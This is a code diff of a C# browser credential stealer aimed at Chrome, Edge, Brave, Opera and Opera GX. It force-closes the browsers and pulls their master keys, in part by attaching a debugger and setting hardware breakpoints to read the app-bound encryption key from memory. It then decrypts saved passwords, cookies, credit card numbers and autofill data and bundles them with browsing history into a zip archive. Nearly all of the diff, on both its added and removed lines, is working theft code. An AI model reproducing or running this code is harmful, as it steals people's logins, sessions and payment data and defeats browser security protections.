@@ -16,7 +16,7 @@ namespace ConsoleApp1
             public string Name { get; set; }
             public string ProcessName { get; set; }
             public string[] ExePaths { get; set; }
-            public string[] DllNames { get; set; }
+            public string DllName { get; set; }
             public string[] UserDataSubdir { get; set; }
             public string OutputDir { get; set; }
             public string TempPrefix { get; set; }
@@ -34,10 +34,9 @@ namespace ConsoleApp1
                 ExePaths = new[]
                 {
                     @"C:\Program Files\Google\Chrome\Application\chrome.exe",
-                    @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
-                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\Application\chrome.exe")
+                    @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
                 },
-                DllNames = new[] { "chrome.dll" },
+                DllName = "chrome.dll",
                 UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                 OutputDir = "chrome",
                 TempPrefix = "chrome_tmp",
@@ -52,10 +51,9 @@ namespace ConsoleApp1
                 ExePaths = new[]
                 {
                     @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-                    @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
-                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\Application\msedge.exe")
+                    @"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
                 },
-                DllNames = new[] { "msedge.dll" },
+                DllName = "msedge.dll",
                 UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" },
                 OutputDir = "edge",
                 TempPrefix = "edge_tmp",
@@ -70,10 +68,9 @@ namespace ConsoleApp1
                 ExePaths = new[]
                 {
                     @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
-                    @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
-                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\Application\brave.exe")
+                    @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
                 },
-                DllNames = new[] { "brave.dll", "chrome.dll" },
+                DllName = "chrome.dll",
                 UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                 OutputDir = "brave",
                 TempPrefix = "brave_tmp",
@@ -91,7 +88,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Opera\launcher.exe",
                     @"C:\Program Files (x86)\Opera\launcher.exe"
                 },
-                DllNames = new[] { "launcher_lib.dll" },
+                DllName = "launcher_lib.dll",
                 UserDataSubdir = new[] { "Opera Software", "Opera Stable" },
                 OutputDir = "opera",
                 TempPrefix = "opera_tmp",
@@ -109,7 +106,7 @@ namespace ConsoleApp1
                     @"C:\Program Files\Opera GX\launcher.exe",
                     @"C:\Program Files (x86)\Opera GX\launcher.exe"
                 },
-                DllNames = new[] { "launcher_lib.dll" },
+                DllName = "launcher_lib.dll",
                 UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                 OutputDir = "operagx",
                 TempPrefix = "operagx_tmp",
@@ -162,6 +159,8 @@ namespace ConsoleApp1
             public uint dwProcessId;
             [FieldOffset(8)]
             public uint dwThreadId;
+            [FieldOffset(12)] // Note: x64 padding
+            public uint dwReserved;
             [FieldOffset(16)]
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 160)]
             public byte[] u;
@@ -237,7 +236,7 @@ namespace ConsoleApp1
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern bool CreateProcess(
             string lpApplicationName,
-            StringBuilder lpCommandLine,
+            string lpCommandLine,
             IntPtr lpProcessAttributes,
             IntPtr lpThreadAttributes,
             bool bInheritHandles,
@@ -448,6 +447,12 @@ namespace ConsoleApp1
 
         public static void Execute(string zipPath)
         {
+            KillProcessesByName("chrome.exe");
+            KillProcessesByName("msedge.exe");
+            KillProcessesByName("brave.exe");
+            KillProcessesByName("opera.exe");
+            KillProcessesByName("launcher.exe");
+
             foreach (var config in Configs)
             {
                 try
@@ -473,10 +478,6 @@ namespace ConsoleApp1
 
             Console.WriteLine($"[*] Processing {config.Name}...");
 
-            KillProcessesByName(config.ProcessName);
-            if (config.ProcessName != "launcher.exe" && config.Name.Contains("Opera"))
-                KillProcessesByName("launcher.exe");
-
             byte[] masterKey = GetV10Key(userDataDir, out bool isDpapi);
             bool shouldDebug = config.HasAbe;
 
@@ -484,13 +485,13 @@ namespace ConsoleApp1
             {
                 if (isDpapi && !config.HasAbe)
                 {
-                    Console.WriteLine($"[*] Found DPAPI key for {config.Name}.");
+                    Console.WriteLine($"[*] {config.Name}: Found DPAPI key, extracting...");
                     ExtractAllProfilesData(null, masterKey, config, userDataDir, zipPath);
                     shouldDebug = false;
                 }
                 else if (!isDpapi && !config.HasAbe)
                 {
-                    Console.WriteLine($"[*] Found ABE key (v20) for {config.Name} in Local State.");
+                    Console.WriteLine($"[*] {config.Name}: Found ABE key in Local State (v20), extracting...");
                     ExtractAllProfilesData(masterKey, null, config, userDataDir, zipPath);
                     shouldDebug = false;
                 }
@@ -498,12 +499,12 @@ namespace ConsoleApp1
 
             if (shouldDebug)
             {
-                Console.WriteLine($"[*] Initiating debugger for {config.Name} ABE extraction...");
+                Console.WriteLine($"[*] {config.Name}: Starting debugger for ABE key extraction...");
                 STARTUPINFO si = new STARTUPINFO();
                 si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-                StringBuilder cmdLine = new StringBuilder($"\"{exePath}\" --no-first-run --no-default-browser-check --no-sandbox --disable-gpu");
+                string cmdLine = $"\"{exePath}\" --no-first-run --no-default-browser-check";
 
                 if (CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
                 {
@@ -514,7 +515,7 @@ namespace ConsoleApp1
                 }
                 else
                 {
-                    Console.WriteLine($"[!] Failed to create debug process for {config.Name}. Error: {Marshal.GetLastWin32Error()}");
+                    Console.WriteLine($"[!] {config.Name}: Failed to start process for debugging.");
                 }
             }
         }
@@ -535,13 +536,13 @@ namespace ConsoleApp1
                     if (GetFinalPathNameByHandle(loadDll.hFile, sb, (uint)sb.Capacity, 0) > 0)
                     {
                         string path = sb.ToString();
-                        if (config.DllNames.Any(d => path.IndexOf(d, StringComparison.OrdinalIgnoreCase) >= 0))
+                        if (path.IndexOf(config.DllName, StringComparison.OrdinalIgnoreCase) >= 0)
                         {
-                            Console.WriteLine($"[*] DLL Loaded: {Path.GetFileName(path)} at {loadDll.lpBaseOfDll:X}");
+                            Console.WriteLine($"[*] Debugger: Found {config.DllName} at {loadDll.lpBaseOfDll:X}");
                             targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll);
                             if (targetAddress != IntPtr.Zero)
                             {
-                                Console.WriteLine($"[*] Signature found at {targetAddress:X}. Setting hardware breakpoints...");
+                                Console.WriteLine($"[*] Debugger: Target signature found at {targetAddress:X}. Setting breakpoints...");
                                 foreach (uint tid in GetProcessThreads(debugEvent.dwProcessId))
                                 {
                                     SetHardwareBreakpoint(tid, targetAddress);
@@ -565,19 +566,15 @@ namespace ConsoleApp1
                     {
                         if (exception.ExceptionRecord.ExceptionAddress == targetAddress)
                         {
-                            Console.WriteLine($"[*] Hardware breakpoint hit!");
+                            Console.WriteLine($"[*] Debugger: Breakpoint hit!");
                             if (ExtractKeyFromThread(debugEvent.dwThreadId, hProcess, config, userDataDir, zipPath))
                             {
-                                Console.WriteLine($"[*] Master key extracted!");
+                                Console.WriteLine($"[*] Debugger: Key extracted successfully.");
                                 ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                                 return;
                             }
                         }
                         SetResumeFlag(debugEvent.dwThreadId);
-                    }
-                    else
-                    {
-                        continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                     }
                 }
                 else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
@@ -592,14 +589,8 @@ namespace ConsoleApp1
         private static T PtrToStructure<T>(byte[] bytes) where T : struct
         {
             GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
-            try
-            {
-                return Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject());
-            }
-            finally
-            {
-                handle.Free();
-            }
+            try { return Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject()); }
+            finally { handle.Free(); }
         }
 
         private static IntPtr FindTargetAddress(IntPtr hProcess, IntPtr baseAddr)
@@ -625,7 +616,7 @@ namespace ConsoleApp1
             for (int i = 0; i < numSections; i++)
             {
                 string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
-                if (name.StartsWith(".rdata") || name.StartsWith(".data"))
+                if (name == ".rdata")
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
@@ -646,8 +637,8 @@ namespace ConsoleApp1
 
             for (int i = 0; i < numSections; i++)
             {
-                uint characteristics = BitConverter.ToUInt32(sectionHeaders, i * 40 + 36);
-                if ((characteristics & 0x20000020) != 0) // IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
+                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
+                if (name == ".text")
                 {
                     uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                     uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
@@ -749,8 +740,7 @@ namespace ConsoleApp1
             ctx.ContextFlags = CONTEXT_FULL;
             if (GetThreadContext(hThread, ref ctx))
             {
-                // Try R12 through R15, as different versions/optimizations might use different registers
-                ulong[] ptrs = new[] { ctx.R15, ctx.R14, ctx.R13, ctx.R12 };
+                ulong[] ptrs = config.UseR14 ? new[] { ctx.R14, ctx.R15 } : new[] { ctx.R15, ctx.R14 };
                 foreach (ulong ptr in ptrs)
                 {
                     if (ptr == 0) continue;
@@ -759,25 +749,17 @@ namespace ConsoleApp1
                     {
                         ulong dataPtr = ptr;
                         ulong length = BitConverter.ToUInt64(buffer, 8);
+                        if (length == 32) dataPtr = BitConverter.ToUInt64(buffer, 0);
 
-                        if (length == 32)
+                        byte[] key = new byte[32];
+                        if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
                         {
-                            dataPtr = BitConverter.ToUInt64(buffer, 0);
-                            if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, buffer, 32, out _))
+                            if (key.Any(b => b != 0))
                             {
-                                if (buffer.Any(b => b != 0))
-                                {
-                                    ExtractAllProfilesData(buffer, null, config, userDataDir, zipPath);
-                                    success = true;
-                                    break;
-                                }
+                                ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
+                                success = true;
+                                break;
                             }
-                        }
-                        else if (buffer.Any(b => b != 0)) // Maybe register already points to the key
-                        {
-                            ExtractAllProfilesData(buffer, null, config, userDataDir, zipPath);
-                            success = true;
-                            break;
                         }
                     }
                 }
@@ -815,11 +797,7 @@ namespace ConsoleApp1
                 int end = content.IndexOf("\"", start);
                 string encryptedKeyB64 = content.Substring(start, end - start);
 
-                uint pcbBinary = 0;
-                CryptStringToBinary(encryptedKeyB64, (uint)encryptedKeyB64.Length, CRYPT_STRING_BASE64, null, ref pcbBinary, IntPtr.Zero, IntPtr.Zero);
-                byte[] encryptedKey = new byte[pcbBinary];
-                CryptStringToBinary(encryptedKeyB64, (uint)encryptedKeyB64.Length, CRYPT_STRING_BASE64, encryptedKey, ref pcbBinary, IntPtr.Zero, IntPtr.Zero);
-
+                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyB64);
                 byte[] encryptedBlob;
                 if (Encoding.ASCII.GetString(encryptedKey, 0, 5) == "DPAPI")
                 {
@@ -827,10 +805,7 @@ namespace ConsoleApp1
                     encryptedBlob = new byte[encryptedKey.Length - 5];
                     Array.Copy(encryptedKey, 5, encryptedBlob, 0, encryptedBlob.Length);
                 }
-                else
-                {
-                    encryptedBlob = encryptedKey;
-                }
+                else { encryptedBlob = encryptedKey; }
 
                 CRYPT_INTEGER_BLOB input = new CRYPT_INTEGER_BLOB { cbData = (uint)encryptedBlob.Length, pbData = Marshal.AllocHGlobal(encryptedBlob.Length) };
                 Marshal.Copy(encryptedBlob, 0, input.pbData, encryptedBlob.Length);
@@ -853,14 +828,11 @@ namespace ConsoleApp1
             if (blob == null || blob.Length < 15) return null;
 
             string prefix = Encoding.ASCII.GetString(blob, 0, 3);
-            byte[] key = null;
+            byte[] key = (prefix == "v20") ? v20Key : v10Key;
+            if (key == null) key = (prefix == "v20") ? v10Key : v20Key;
 
-            if (prefix == "v10" || prefix == "v20")
+            if ((prefix == "v10" || prefix == "v20") && key != null)
             {
-                key = (prefix == "v20") ? v20Key : v10Key;
-                if (key == null) key = (prefix == "v20") ? v10Key : v20Key; // Fallback
-                if (key == null) return null;
-
                 byte[] nonce = new byte[12];
                 Array.Copy(blob, 3, nonce, 0, 12);
                 byte[] ciphertext = new byte[blob.Length - 15 - 16];
@@ -882,7 +854,6 @@ namespace ConsoleApp1
             }
             else
             {
-                // DPAPI fallback
                 CRYPT_INTEGER_BLOB input = new CRYPT_INTEGER_BLOB { cbData = (uint)blob.Length, pbData = Marshal.AllocHGlobal(blob.Length) };
                 Marshal.Copy(blob, 0, input.pbData, blob.Length);
                 if (CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out CRYPT_INTEGER_BLOB output))
@@ -900,11 +871,7 @@ namespace ConsoleApp1
 
         private static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
         {
-            IntPtr hAlg = IntPtr.Zero;
-            IntPtr hKey = IntPtr.Zero;
-            IntPtr pbNonce = IntPtr.Zero;
-            IntPtr pbTag = IntPtr.Zero;
-
+            IntPtr hAlg = IntPtr.Zero; IntPtr hKey = IntPtr.Zero; IntPtr pbNonce = IntPtr.Zero; IntPtr pbTag = IntPtr.Zero;
             try
             {
                 if (BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0) != 0) return null;
@@ -912,26 +879,17 @@ namespace ConsoleApp1
                 if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, (uint)chainMode.Length, 0) != 0) return null;
                 if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0) != 0) return null;
 
-                pbNonce = Marshal.AllocHGlobal(nonce.Length);
-                Marshal.Copy(nonce, 0, pbNonce, nonce.Length);
-                pbTag = Marshal.AllocHGlobal(tag.Length);
-                Marshal.Copy(tag, 0, pbTag, tag.Length);
+                pbNonce = Marshal.AllocHGlobal(nonce.Length); Marshal.Copy(nonce, 0, pbNonce, nonce.Length);
+                pbTag = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, pbTag, tag.Length);
 
                 BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                 authInfo.cbSize = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                 authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
-                authInfo.pbNonce = pbNonce;
-                authInfo.cbNonce = (uint)nonce.Length;
-                authInfo.pbTag = pbTag;
-                authInfo.cbTag = (uint)tag.Length;
+                authInfo.pbNonce = pbNonce; authInfo.cbNonce = (uint)nonce.Length;
+                authInfo.pbTag = pbTag; authInfo.cbTag = (uint)tag.Length;
 
-                byte[] output = new byte[ciphertext.Length];
-                uint pcbResult = 0;
-
-                if (BCryptDecrypt(hKey, ciphertext, (uint)ciphertext.Length, ref authInfo, null, 0, output, (uint)output.Length, out pcbResult, 0) == 0)
-                {
-                    return output;
-                }
+                byte[] output = new byte[ciphertext.Length]; uint pcbResult = 0;
+                if (BCryptDecrypt(hKey, ciphertext, (uint)ciphertext.Length, ref authInfo, null, 0, output, (uint)output.Length, out pcbResult, 0) == 0) return output;
             }
             catch { }
             finally
@@ -946,17 +904,9 @@ namespace ConsoleApp1
 
         private static void ExtractAllProfilesData(byte[] v20Key, byte[] v10Key, BrowserConfig config, string userDataDir, string zipPath)
         {
-            var profiles = Directory.GetDirectories(userDataDir)
-                .Where(d => File.Exists(Path.Combine(d, "Preferences")))
-                .Select(Path.GetFileName)
-                .ToList();
-
+            var profiles = Directory.GetDirectories(userDataDir).Where(d => File.Exists(Path.Combine(d, "Preferences"))).Select(Path.GetFileName).ToList();
+            if (File.Exists(Path.Combine(userDataDir, "Preferences")) && !profiles.Contains(".")) profiles.Add(".");
             bool isOpera = config.Name.Contains("Opera");
-
-            if (File.Exists(Path.Combine(userDataDir, "Preferences")) && !profiles.Contains("."))
-            {
-                profiles.Add(".");
-            }
 
             foreach (var profile in profiles)
             {
@@ -978,10 +928,7 @@ namespace ConsoleApp1
                 using (var zip = ZipFile.Open(zipPath, File.Exists(zipPath) ? ZipArchiveMode.Update : ZipArchiveMode.Create))
                 {
                     var entry = zip.CreateEntry(entryName);
-                    using (var writer = new StreamWriter(entry.Open()))
-                    {
-                        writer.Write(content);
-                    }
+                    using (var writer = new StreamWriter(entry.Open())) { writer.Write(content); }
                 }
             }
             catch { }
@@ -1001,31 +948,22 @@ namespace ConsoleApp1
         {
             string dbPath = Path.Combine(profilePath, "Login Data");
             if (!File.Exists(dbPath)) return;
-
             string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
             try
             {
                 File.Copy(dbPath, tempDb);
                 if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                 {
-                    string sql = "SELECT origin_url, username_value, password_value FROM logins";
-                    if (sqlite3_prepare_v2(db, sql, -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
+                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
                     {
                         StringBuilder sb = new StringBuilder();
                         while (sqlite3_step(stmt) == SQLITE_ROW)
                         {
-                            string url = GetSQLiteString(stmt, 0);
-                            string user = GetSQLiteString(stmt, 1);
-                            int blobSize = sqlite3_column_bytes(stmt, 2);
-                            IntPtr blobPtr = sqlite3_column_blob(stmt, 2);
-                            byte[] blob = new byte[blobSize];
-                            Marshal.Copy(blobPtr, blob, 0, blobSize);
-
+                            string url = GetSQLiteString(stmt, 0); string user = GetSQLiteString(stmt, 1);
+                            int bSize = sqlite3_column_bytes(stmt, 2); byte[] blob = new byte[bSize];
+                            Marshal.Copy(sqlite3_column_blob(stmt, 2), blob, 0, bSize);
                             byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
-                            if (dec != null)
-                            {
-                                sb.AppendLine($"URL: {url}\nUser: {user}\nPass: {Encoding.UTF8.GetString(dec)}\n---");
-                            }
+                            if (dec != null) sb.AppendLine($"URL: {url}\nUser: {user}\nPass: {Encoding.UTF8.GetString(dec)}\n---");
                         }
                         sqlite3_finalize(stmt);
                         if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/passwords.txt", sb.ToString());
@@ -1033,8 +971,7 @@ namespace ConsoleApp1
                     sqlite3_close(db);
                 }
             }
-            catch { }
-            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
+            catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
         }
 
         private static void ExtractCookies(string profilePath, string zipPath, byte[] v10Key, byte[] v20Key, string browser, string profile, bool isOpera)
@@ -1042,32 +979,23 @@ namespace ConsoleApp1
             string dbPath = Path.Combine(profilePath, "Network", "Cookies");
             if (!File.Exists(dbPath)) dbPath = Path.Combine(profilePath, "Cookies");
             if (!File.Exists(dbPath)) return;
-
             string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
             try
             {
                 File.Copy(dbPath, tempDb);
                 if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                 {
-                    string sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
-                    if (sqlite3_prepare_v2(db, sql, -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
+                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, value, encrypted_value FROM cookies", -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
                     {
                         StringBuilder sb = new StringBuilder();
                         while (sqlite3_step(stmt) == SQLITE_ROW)
                         {
-                            string host = GetSQLiteString(stmt, 0);
-                            string name = GetSQLiteString(stmt, 1);
-                            string value = GetSQLiteString(stmt, 2);
-                            int blobSize = sqlite3_column_bytes(stmt, 3);
-                            IntPtr blobPtr = sqlite3_column_blob(stmt, 3);
-                            byte[] blob = new byte[blobSize];
-                            Marshal.Copy(blobPtr, blob, 0, blobSize);
-
+                            string host = GetSQLiteString(stmt, 0); string name = GetSQLiteString(stmt, 1); string val = GetSQLiteString(stmt, 2);
+                            int bSize = sqlite3_column_bytes(stmt, 3); byte[] blob = new byte[bSize];
+                            Marshal.Copy(sqlite3_column_blob(stmt, 3), blob, 0, bSize);
                             byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
-                            string cookieVal = dec != null ? Encoding.UTF8.GetString(dec) : value;
-
-                            if (!string.IsNullOrEmpty(cookieVal))
-                                sb.AppendLine($"Host: {host} | Name: {name} | Value: {cookieVal}");
+                            string cVal = dec != null ? Encoding.UTF8.GetString(dec) : val;
+                            if (!string.IsNullOrEmpty(cVal)) sb.AppendLine($"Host: {host} | Name: {name} | Value: {cVal}");
                         }
                         sqlite3_finalize(stmt);
                         if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/cookies.txt", sb.ToString());
@@ -1075,15 +1003,13 @@ namespace ConsoleApp1
                     sqlite3_close(db);
                 }
             }
-            catch { }
-            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
+            catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
         }
 
         private static void ExtractAutofill(string profilePath, string zipPath, byte[] v10Key, byte[] v20Key, string browser, string profile, bool isOpera)
         {
             string dbPath = Path.Combine(profilePath, "Web Data");
             if (!File.Exists(dbPath)) return;
-
             string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
             try
             {
@@ -1091,72 +1017,52 @@ namespace ConsoleApp1
                 if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                 {
                     StringBuilder sb = new StringBuilder();
-
-                    // Autofill
                     IntPtr stmt;
                     if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, out stmt, IntPtr.Zero) == SQLITE_OK)
                     {
-                        while (sqlite3_step(stmt) == SQLITE_ROW)
-                        {
-                            sb.AppendLine($"Form: {GetSQLiteString(stmt, 0)} = {GetSQLiteString(stmt, 1)}");
-                        }
+                        while (sqlite3_step(stmt) == SQLITE_ROW) sb.AppendLine($"Form: {GetSQLiteString(stmt, 0)} = {GetSQLiteString(stmt, 1)}");
                         sqlite3_finalize(stmt);
                     }
-
-                    // Credit Cards
                     if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, out stmt, IntPtr.Zero) == SQLITE_OK)
                     {
                         while (sqlite3_step(stmt) == SQLITE_ROW)
                         {
-                            string name = GetSQLiteString(stmt, 0);
-                            int m = sqlite3_column_int(stmt, 1);
-                            int y = sqlite3_column_int(stmt, 2);
-                            int blobSize = sqlite3_column_bytes(stmt, 3);
-                            byte[] blob = new byte[blobSize];
-                            Marshal.Copy(sqlite3_column_blob(stmt, 3), blob, 0, blobSize);
-
+                            string n = GetSQLiteString(stmt, 0); int m = sqlite3_column_int(stmt, 1); int y = sqlite3_column_int(stmt, 2);
+                            int bSize = sqlite3_column_bytes(stmt, 3); byte[] blob = new byte[bSize];
+                            Marshal.Copy(sqlite3_column_blob(stmt, 3), blob, 0, bSize);
                             byte[] dec = DecryptBlob(blob, v10Key, v20Key, isOpera);
-                            if (dec != null)
-                                sb.AppendLine($"Card: {name} | Exp: {m}/{y} | Num: {Encoding.UTF8.GetString(dec)}");
+                            if (dec != null) sb.AppendLine($"Card: {n} | Exp: {m}/{y} | Num: {Encoding.UTF8.GetString(dec)}");
                         }
                         sqlite3_finalize(stmt);
                     }
-
                     if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/autofill.txt", sb.ToString());
                     sqlite3_close(db);
                 }
             }
-            catch { }
-            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
+            catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
         }
 
         private static void ExtractHistory(string profilePath, string zipPath, string browser, string profile)
         {
             string dbPath = Path.Combine(profilePath, "History");
             if (!File.Exists(dbPath)) return;
-
             string tempDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
             try
             {
                 File.Copy(dbPath, tempDb);
                 if (sqlite3_open(tempDb, out IntPtr db) == SQLITE_OK)
                 {
-                    string sql = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100";
-                    if (sqlite3_prepare_v2(db, sql, -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
+                    if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100", -1, out IntPtr stmt, IntPtr.Zero) == SQLITE_OK)
                     {
                         StringBuilder sb = new StringBuilder();
-                        while (sqlite3_step(stmt) == SQLITE_ROW)
-                        {
-                            sb.AppendLine($"URL: {GetSQLiteString(stmt, 0)} | Title: {GetSQLiteString(stmt, 1)} | Visits: {sqlite3_column_int(stmt, 2)}");
-                        }
+                        while (sqlite3_step(stmt) == SQLITE_ROW) sb.AppendLine($"URL: {GetSQLiteString(stmt, 0)} | Title: {GetSQLiteString(stmt, 1)} | Visits: {sqlite3_column_int(stmt, 2)}");
                         sqlite3_finalize(stmt);
                         if (sb.Length > 0) AddToZip(zipPath, $"browsers/{browser}/{profile}/history.txt", sb.ToString());
                     }
                     sqlite3_close(db);
                 }
             }
-            catch { }
-            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
+            catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
         }
 
         #endregion
